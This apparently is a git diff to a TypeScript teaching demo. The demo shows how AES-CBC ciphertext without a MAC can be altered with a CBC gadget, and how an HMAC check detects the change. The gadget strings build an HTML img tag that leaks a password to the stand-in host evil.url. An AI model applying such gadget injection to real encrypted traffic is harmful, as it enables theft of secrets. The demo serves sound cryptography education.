@@ -8,10 +8,10 @@ const message = Buffer.from('Your password is:Se@ld-i5-great')
 const g0 = Buffer.from(' <img ignore= " ')
 const g1 = Buffer.from(' " src=evil.url/')
 
-const firstBlock = Buffer.from('Your password is')
+const p0 = Buffer.from('Your password is')
 
 // to check that the firstBlock matches the first block of the message, otherwise the demo does not work
-if (!message.subarray(0, 16).equals(firstBlock)) throw new Error('the first block must be known for the attack to work')
+if (!message.subarray(0, 16).equals(p0)) throw new Error('the first block must be known for the attack to work')
 
 /**
  * Scenario where Alice encrypts a message with an AES-CBC, sends it to Bob (we don't care about how they send the key,
@@ -21,7 +21,7 @@ if (!message.subarray(0, 16).equals(firstBlock)) throw new Error('the first bloc
  * This attacker modifies the encrypted message so that when it is decrypted it contains and <img> tag which will
  * exfiltrate the sensitive data to evil.url if Bob's client interprets the clear text message as HTML.
  */
-const encryptWithoutMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: Buffer, gagdet0: Buffer, gadget1: Buffer) => {
+const encryptWithoutMacInjectGadgetThenDecrypt = (message: Buffer, p0: Buffer, g0: Buffer, g1: Buffer) => {
     // Alice generates a key and shares it magically with Bob
     const key = randomBytes(32)
 
@@ -29,17 +29,17 @@ const encryptWithoutMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: B
     const encryptedMessage = encrypt(message, key)
 
     // An attacker intercepts the encrypted message, and modifies it with a CBC gadget
-    const maliciousMessage = injectGadget(encryptedMessage, firstBlock, gagdet0, gadget1)
+    const maliciousMessage = injectGadget(encryptedMessage, p0, g0, g1)
 
     // Bob decrypts naively the message, and displays it in an HTML reader
     const decryptedMessage = decrypt(maliciousMessage, key).toString('utf8')
 
     // contains something like: <img ignore= "**garbage**" src=evil.url/:Se@ld-i5-great
     // which exfiltrates the sensitive data to evil.url
-    console.log('decryptedMessage:', decryptedMessage)
+    console.log('decryptedMessage (pure CBC):', decryptedMessage)
 }
 
-encryptWithoutMacInjectGadgetThenDecrypt(message, firstBlock, g0, g1)
+encryptWithoutMacInjectGadgetThenDecrypt(message, p0, g0, g1)
 
 /**
  * Same scenario as before, but Alice and Bob now use a symmetric scheme with a MAC which allows Bob to detect the fact
@@ -65,15 +65,17 @@ const encryptWithMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: Buff
         // we should not reach this point as checkedEncryptedMessage should throw 'MAC invalid'
 
         const decryptedMessage = decrypt(checkedEncryptedMessage, keyEnc).toString('utf8')
-        console.log('decryptedMessage:', decryptedMessage)
+        console.log('decryptedMessage (altered):', decryptedMessage)
         throw new Error('Unexpected: MAC is valid')
 
     } catch (error) {
         // Bob detects that the message has been altered, and throws
         if (error.message !== 'MAC invalid') throw error
         console.warn('MAC verification has failed, a modification of the ciphertext has been detected')
+        const checkedEncryptedMessage = checkMacThenReturnPayload(encryptedMessageWithMac, keyMac)
+        const decryptedMessage = decrypt(checkedEncryptedMessage, keyEnc).toString('utf8')
+        console.log('decryptedMessage (CBC + HMAC):', decryptedMessage)
     }
 }
 
-encryptWithMacInjectGadgetThenDecrypt(message, firstBlock, g0, g1)
-
+encryptWithMacInjectGadgetThenDecrypt(message, p0, g0, g1)
